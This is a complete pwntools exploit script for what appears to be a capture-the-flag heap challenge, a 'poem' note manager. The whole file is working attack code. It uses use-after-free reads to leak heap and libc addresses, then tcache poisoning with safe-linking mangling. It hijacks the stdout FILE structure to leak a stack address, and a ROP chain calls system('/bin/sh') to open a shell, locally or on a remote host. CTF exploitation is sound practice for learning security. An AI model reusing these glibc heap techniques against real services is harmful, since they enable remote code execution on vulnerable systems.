#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def poem_write(idx, content):
    io.sendlineafter(b"Choice:", b"1")
    io.sendlineafter(b"name:", p8(idx))
    io.sendlineafter(b"name:", p8(idx))
    io.sendlineafter(b"content:", content)

def poem_read(idx):
    io.sendlineafter(b"Choice:", b"2")
    io.sendlineafter(b"name:", p8(idx))
    io.recvuntil(b"Content: ")
    leak = io.recv(6)
    return leak.strip(b"\n")

def poem_delete(idx):
    io.sendlineafter(b"Choice:", b"3")
    io.sendlineafter(b"name:", p8(idx))
    io.sendlineafter(b"name:", p8(idx))

def poem_edit(idx, content):
    io.sendlineafter(b"Choice:", b"4")
    io.sendlineafter(b"name:", p8(idx))
    io.sendlineafter(b"name:", p8(idx))
    io.sendlineafter(b"content:", content)

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 


def solve():

    """
    Leak libc and heap
    """

    poem_write(0, b"C")
    poem_write(1, b"D")
    poem_delete(0)
    heap_base = u64(poem_read(0).ljust(8, b"\x00")) << 12
    info("heap base: %#x", heap_base)

    for _ in range(7):
        poem_edit(0, b"A"*9)
        poem_delete(0)
    
    main_arena = u64(poem_read(0).ljust(8, b"\x00"))
    libc.address = main_arena - 0x203b20
    info("libc base: %#x", libc.address)

    poem_delete(1)
    poem_edit(0, p64(mangle(heap_base, heap_base+0x10)))
    poem_write(2, b"A")
    poem_write(3, p64(0) * (255 // 8)) # clear tcache_perthread_struct

    """
    Leak stack with stdout
    """

    poem_write(0, b"A"*8)
    poem_delete(0)
    poem_edit(0, b"A"*9)
    poem_delete(0)

    poem_edit(0, p64(mangle(heap_base, libc.sym["_IO_2_1_stdout_"])))
    poem_write(1, b"A")

    addr = libc.sym["environ"]
    size=8
    new_stdout = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr+size)*3 + p64(addr+size+1)

    poem_write(2, new_stdout)
    stack = u64(io.recv_raw(8))
    info("stack: %#x", stack)

    addr = libc.address + 0x204643
    init_stdout = p64(0xfbad2887) + p64(addr) * 6 + p64(addr + 1)
    poem_edit(2, init_stdout)

    poem_edit(0, p64(0) * (255 // 8)) # clear tcache_perthread_struct again for final exp
    
    poem_delete(0)
    poem_edit(0, b"A"*9)
    poem_delete(0)

    return_addr = stack - 0x150 - 0x8
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    chain = flat(
        [
            0x0,
            pop_rdi,
            sh,
            pop_rdi + 1,
            system
        ]
    )
    poem_edit(0, p64(mangle(heap_base, return_addr)))
    poem_write(1, b"A")
    poem_write(2, chain)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

